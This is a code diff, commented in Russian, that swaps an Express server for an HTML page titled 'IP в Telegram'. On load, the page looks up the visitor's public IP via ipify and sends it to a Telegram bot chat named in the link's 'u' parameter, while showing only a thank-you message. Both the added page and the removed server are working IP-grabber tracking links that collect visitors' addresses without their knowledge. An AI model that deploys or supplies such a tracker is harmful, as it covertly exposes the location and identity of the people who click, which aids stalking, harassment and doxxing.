@@ -1,40 +1,44 @@
-const express = require('express');
-const fetch = require('node-fetch');
-const app = express();
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>IP в Telegram</title>
+  <script>
+    window.onload = async function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      const chat_id = urlParams.get('u'); // u — это chat_id
 
-const BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
-const CHAT_ID = 'ВАШ_CHAT_ID'; // можно сделать динамическим, если нужно
-const PORT = 3000;
+      const BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
 
-app.use(express.json());
+      if (chat_id) {
+        try {
+          // Получаем IP через API
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
 
-app.get('/', async (req, res) => {
-  const u = req.query.u;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+          const message = `👤 Новый визит\n🌐 IP: ${ipData.ip}`;
 
-  if (!u) {
-    return res.status(400).send('Missing "u" parameter');
-  }
+          // Отправляем сообщение в Telegram
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chat_id,
+              text: message
+            })
+          });
 
-  const message = `👤 Новый переход\n🔗 u: ${u}\n🌐 IP: ${ip}`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message
-      })
-    });
-
-    res.send('OK');
-  } catch (err) {
-    console.error('Ошибка отправки в Telegram:', err);
-    res.status(500).send('Ошибка');
-  }
-});
-
-app.listen(PORT, () => {
-  console.log(`Сервер запущен на порту ${PORT}`);
-});
+          console.log('Сообщение отправлено в Telegram');
+        } catch (error) {
+          console.error('Ошибка отправки:', error);
+        }
+      } else {
+        console.warn('Параметр u (chat_id) не найден');
+      }
+    };
+  </script>
+</head>
+<body>
+  <h1>Спасибо за визит!</h1>
+</body>
+</html>
